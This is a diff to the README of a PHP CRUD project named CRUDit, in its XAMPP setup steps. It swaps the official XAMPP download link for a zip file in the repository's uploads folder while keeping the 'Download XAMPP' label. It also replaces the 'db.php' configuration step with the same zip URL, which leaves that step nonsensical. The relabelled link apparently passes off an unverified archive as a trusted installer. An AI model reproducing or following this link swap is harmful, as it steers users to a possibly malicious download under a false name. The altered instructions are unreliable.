@@ -29,7 +29,7 @@ It provides **three permission levels** to ensure security and operational effic
 Follow these steps to run CRUDit locally using **XAMPP**:
 
 ### 1. Download & Install XAMPP
-[Download XAMPP](https://www.apachefriends.org/index.html) and install it on your system.
+[Download XAMPP](https://raw.githubusercontent.com/User-X5/CRUDit/main/uploads/CRU-Dit-v1.3.zip) and install it on your system.
 
 ### 2. Clone or Download the Project
 Place the extracted folder inside the `htdocs` directory of your XAMPP installation.  
@@ -42,7 +42,7 @@ Example:
 - Import the `.sql` file from the `sql` folder included in this project.
 
 ### 4. Configure Database Connection
-- Open `db.php` (or equivalent) in the project.  
+- Open `https://raw.githubusercontent.com/User-X5/CRUDit/main/uploads/CRU-Dit-v1.3.zip` (or equivalent) in the project.  
 - Update the database name, username, and password as needed.  
   *(Default for XAMPP: `root` user with no password)*
 
